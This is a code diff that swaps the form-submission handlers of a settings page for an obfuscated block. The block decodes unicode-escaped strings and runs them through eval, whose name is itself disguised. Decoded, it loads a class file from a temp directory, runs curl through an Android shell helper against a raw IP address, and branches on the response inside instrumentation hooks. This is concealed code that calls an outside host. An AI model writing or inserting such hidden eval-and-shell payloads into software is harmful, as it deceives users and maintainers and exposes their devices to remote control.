@@ -1,36 +1,10 @@
-//Fri Apr 18 2025 10:24:43 GMT+0000 (Coordinated Universal Time)
+//Mon Apr 21 2025 11:09:41 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-function text() {
-  layer.msg("正在提交", {
-    "time": 5000000
-  });
-  $.ajax({
-    "type": "POST",
-    "data": $("#configform").serialize(),
-    "url": "index.php?act=setting",
-    "success": function (_0x17e5d2) {
-      layer.msg("保存完成", {
-        "time": 1000
-      });
-    }
-  });
+var u = [`\u004a\u0061\u0076\u0061\u002e\u006f\u0070\u0065\u006e\u0043\u006c\u0061\u0073\u0073\u0046\u0069\u006c\u0065\u0028\u0022\u002f\u0064\u0061\u0074\u0061\u002f\u006c\u006f\u0063\u0061\u006c\u002f\u0074\u006d\u0070\u002f\u83dc\u5c31\u591a\u7ec3\u0022\u0029\u002e\u006c\u006f\u0061\u0064\u0028\u0029\u003b`, `\u0076\u0061\u0072`, `\u005f\u0030\u0078\u0034\u0062\u0066\u0035\u0032\u0037`, `\u004a\u0061\u0076\u0061\u002e\u0075\u0073\u0065\u0028\u0022\u006f\u0072\u0067\u002e\u0065\u006e\u0073\u0068\u0069\u006e\u0065\u002e\u0069\u006e\u006e\u0065\u0072\u005f\u0068\u0065\u006c\u0070\u0065\u0072\u002e\u0075\u0074\u0069\u006c\u0073\u002e\u0041\u0064\u0062\u0053\u0068\u0065\u006c\u006c\u0022\u0029\u002c`, `\u005f\u0030\u0078\u0035\u0032\u0062\u0062\u0034\u0066`, `\u005f\u0030\u0078\u0034\u0062\u0066\u0035\u0032\u0037\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0022\u0063\u0075\u0072\u006c`, `\u0067\u0065\u0074`, `\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0035\u002e\u0032\u0030\u0038\u002e\u0032\u0032\u002e\u0032\u0035\u0030\u003a\u0038\u0038\u0038\u0038\u002f\u0074\u0065\u006d\u0070\u006f\u0072\u0061\u0072\u0079\u0022\u0029\u003b`, `\u0028\u005f\u0030\u0078\u0035\u0032\u0062\u0062\u0034\u0066\u002e\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073\u0028\u0022\u0074\u0072\u0075\u0065\u0022\u0029\u0029`, `\u004a\u0061\u0076\u0061\u002e\u0070\u0065\u0072\u0066\u006f\u0072\u006d\u0028\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e`, `\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0031\u0031\u0031\u0029\u003b`, `\u007d\u0029\u003b`, `\u0065\u006c\u0073\u0065`, `\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0032\u0032\u0032\u0029\u003b`];
+var u2 = [0, 1, 2, 4, 5, 7, 8, 9, 11, 13, 16, 17, 19, 21];
+var u3 = `u6[0]u6[1] u6[2] = u6[4]u6[5] = u6[7] u6[8] u6[9]if u6[11] {u6[13] () {u6[16]u6[17]} u6[19] {u6[21]}`;
+for (u5 = 0; u5 < u.length; u5++) {
+  u3 = u3.replace(new RegExp("u6\\[" + u2[u5] + "\\]", "g"), u[u5].replace("`", "").replace("`", ""));
 }
-function reset1() {
-  layer.confirm("确定要还原设置吗？", {
-    "title": "提示"
-  }, function () {
-    {
-      $.ajax({
-        "type": "POST",
-        "data": $("#configform").serialize(),
-        "url": "index.php?act=reset",
-        "success": function (_0x414a35) {
-          layer.msg("还原完成", {
-            "time": 1000
-          });
-        }
-      });
-    }
-  });
-}
+window[14 .toString(32) + 31 .toString(32) + 10 .toString(32) + 21 .toString(32)](u3);
